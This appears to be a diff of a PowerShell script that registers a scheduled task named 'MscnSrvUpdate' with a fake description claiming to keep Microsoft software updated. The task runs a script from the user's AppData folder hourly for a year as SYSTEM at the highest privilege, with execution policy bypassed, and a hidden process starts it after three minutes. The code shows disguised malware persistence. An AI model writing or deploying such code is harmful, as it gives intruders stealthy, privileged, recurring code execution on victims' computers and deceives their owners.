@@ -1,19 +1,14 @@
-# Eliminar una tarea existente llamada "MscnSrvUpdate"
+$currentUsername = (Get-WmiObject -Class Win32_ComputerSystem).UserName
+$cleanUsername = $currentUsername.Split("\")[-1]
+$USERNAMEPTH = "C:\Users\$cleanUsername"
 Unregister-ScheduledTask -TaskName "MscnSrvUpdate" -Confirm:$false -ErrorAction SilentlyContinue
 
-# Crear una acción para la tarea
-$action = New-ScheduledTaskAction -Execute "wscript.exe" -Argument "C:\Users\$env:USERNAME\AppData\Local\Microsoft\MsUpdate\Mscntask.vbs"
+$action = New-ScheduledTaskAction -Execute "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -Argument "-Executionpolicy Bypass -NoProfile -File $USERNAMEPTH\AppData\Local\Microsoft\MsUpdate\Mscntask.ps1"
+$trigger = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes 60) -RepetitionDuration (New-TimeSpan -Days 365)
+$settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -StartWhenAvailable -DontStopIfGoingOnBatteries -DontStopOnIdleEnd -ExecutionTimeLimit 0
+$principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
 
-# Crear un disparador que se ejecute una vez y luego se repita cada hora durante un año
-$trigger = New-ScheduledTaskTrigger -Once -At "00:00AM" -RepetitionInterval (New-TimeSpan -Minutes 60) -RepetitionDuration (New-TimeSpan -Days 365)
-
-# Configuración de la tarea
-$settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -StartWhenAvailable
-
-# Registrar la tarea con la cuenta del sistema (privilegios elevados)
-Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "MscnSrvUpdate" `
-    -Description "Mantiene actualizado el software de Microsoft. Si esta tarea está deshabilitada o detenida, el software de Microsoft no se actualizará." `
-    -Settings $settings -User "SYSTEM" -RunLevel Highest | Out-Null
+Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "MscnSrvUpdate" -Description "Mantiene actualizado el software de Microsoft. Si esta tarea esta deshabilitada o detenida, el software de Microsoft no se actualizara" -Settings $settings -Principal $principal | Out-Null
 
 
 Start-Process powershell.exe -ArgumentList "-NoProfile -ExecutionPolicy Bypass -Command 'Start-Sleep -Seconds 180; Start-ScheduledTask -TaskName \"MscnSrvUpdate\"'" -WindowStyle Hidden
